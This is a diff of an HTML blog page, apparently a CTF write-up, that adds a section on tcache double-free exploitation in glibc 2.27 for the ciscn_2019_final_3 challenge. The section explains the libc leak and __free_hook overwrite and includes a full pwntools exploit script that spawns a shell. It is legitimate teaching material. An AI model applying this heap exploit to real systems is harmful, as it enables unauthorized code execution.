@@ -16,15 +16,15 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="tcache poisioning">
+    <meta name="description" content="tcache poisioning, tcache key leak, tcache double free">
 <meta property="og:type" content="article">
 <meta property="og:title" content="tcache attack">
 <meta property="og:url" content="https://isolator-1.github.io/2023/12/01/ctf-pwn/tcache%20attack/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="tcache poisioning">
+<meta property="og:description" content="tcache poisioning, tcache key leak, tcache double free">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-12-01T09:58:00.000Z">
-<meta property="article:modified_time" content="2023-12-01T12:35:58.287Z">
+<meta property="article:modified_time" content="2023-12-02T08:16:13.741Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta property="article:tag" content="exp">
@@ -236,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.4k words
+          7.2k words
         
       </span>
     
@@ -247,7 +247,7 @@
         
         
         
-          37 mins
+          61 mins
         
       </span>
     
@@ -312,7 +312,26 @@
 
 
 
-<h2 id="tcache-key-泄露"><a href="#tcache-key-泄露" class="headerlink" title="tcache key 泄露"></a>tcache key 泄露</h2>
+<h2 id="tcache-key-泄露"><a href="#tcache-key-泄露" class="headerlink" title="tcache key 泄露"></a>tcache key 泄露</h2><h2 id="tcache-double-free"><a href="#tcache-double-free" class="headerlink" title="tcache double free"></a>tcache double free</h2><p>2.26 和 2.27较早的版本是没有double free 检查的，即可以连着2次free同一个chunk</p>
+<h3 id="ciscn-final-3"><a href="#ciscn-final-3" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_final_3">https://buuoj.cn/challenges#ciscn_2019_final_3</a></p>
+<p>libc2.27（无double free检测的版本），只有new和delete，delete之后没有清空指针，并且new之后输出chunk的content部分的地址。不允许分配0x78以上大小的chunk。</p>
+<p>整体思路：通过double free可以在任意地址分配chunk的原理，在某个chunk减16的位置分配chunk，新的chunk就可以修改旧的chunk的sz字段，让他可以被free到 unsorted bin 。</p>
+<p>没有show函数，如何泄露unsorted bin的地址？</p>
+<blockquote>
+<p>切割unsorted bin里的chunk，使这个chunk和一个<strong>已经被free</strong>的tcache chunk开头对齐，这时就相当于修改了tcache chunk的fd，fd= &amp; unsorted bin，</p>
+<p>连续分配两次chunk，就可以在unsorted bin处分配一个chunk， 题目自带泄露chunk地址的功能，就等于泄露了libc</p>
+</blockquote>
+<p>再来一个tcache double free，向free hook写入system，然后free一个content=binsh的chunk，就完事了</p>
+<p><strong>如何想到的呢？</strong></p>
+<p>题目只有new和delete，以及泄露chunk地址。想要泄露libc就必须通过这个自带的泄露实现。因此要在unsorted bin这个地方malloc一个chunk（毕竟我只会通过unsorted bin泄露libc地址），结合题目最大chunk不超过0x78的限制，得到必须要改某个chunk的sz字段的结论。</p>
+<p>然后没有edit，只有new的时候能修改，因此要利用“向任意地址分配chunk”的漏洞，然后一看，正好可以用double free，对上了。</p>
+<p>至于chunk被free到unsorted bin之后如何泄露fd，bk，这确实很难想到。“切割unsorted bin把它的开头和一个free的tcache chunk对齐” 这一点也只有这道题能用了，毕竟需要有知道chunk被分配到哪里的能力。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28198</span>)<br>e = ELF(<span class="hljs-string">&#x27;./ciscn_final_3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>) <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;choice &gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;input the index\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index, size, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice &gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;input the index\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;input the size\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;now you can write something\n&#x27;</span>)<br>    p.sendline(content)<br>    p.recvuntil(<span class="hljs-string">b&#x27;gift :&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>])<br><br>addr0 = new(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">1</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">2</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">3</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">4</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>new(<span class="hljs-number">5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">6</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">7</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">8</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment"># from 0 - 8 -&gt; sz= 0x450</span><br>new(<span class="hljs-number">9</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) <br>new(<span class="hljs-number">10</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br><br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">10</span>)<br>new(<span class="hljs-number">11</span>, <span class="hljs-number">0x70</span>, p64(addr0 - <span class="hljs-number">16</span>))<br>new(<span class="hljs-number">12</span>, <span class="hljs-number">0x70</span>, p64(addr0 - <span class="hljs-number">16</span>))<br>new(<span class="hljs-number">13</span>, <span class="hljs-number">0x70</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x451</span>)) <span class="hljs-comment"># size must be equal to the front </span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">14</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment"># cut unsorted bin chunk</span><br>new(<span class="hljs-number">15</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>main_arena = new(<span class="hljs-number">16</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) - <span class="hljs-number">96</span><br>libc_base = main_arena-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system_addr = libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>new(<span class="hljs-number">17</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>delete(<span class="hljs-number">17</span>)<br>delete(<span class="hljs-number">17</span>)<br>new(<span class="hljs-number">18</span>, <span class="hljs-number">0x10</span>, p64(free_hook))<br>new(<span class="hljs-number">19</span>, <span class="hljs-number">0x10</span>, p64(free_hook))<br>new(<span class="hljs-number">20</span>, <span class="hljs-number">0x10</span>, p64(system_addr))<br>delete(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>还有个地方没想明白，为什么题目里这个0x40，改成0x50也对（同时也修改0x461），改成0x70（同时也修改0x481）就不对了。。。想不明白了 😭</p>
+<h2 id="tcache-stash"><a href="#tcache-stash" class="headerlink" title="tcache stash"></a>tcache stash</h2><p>with fastbin double free</p>
+<h3 id="ciscn-final-3-1"><a href="#ciscn-final-3-1" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h3><p>还是上一节这道题，不用tcache 连续double free无检查的漏洞。</p>
+
                 
               </div>
             
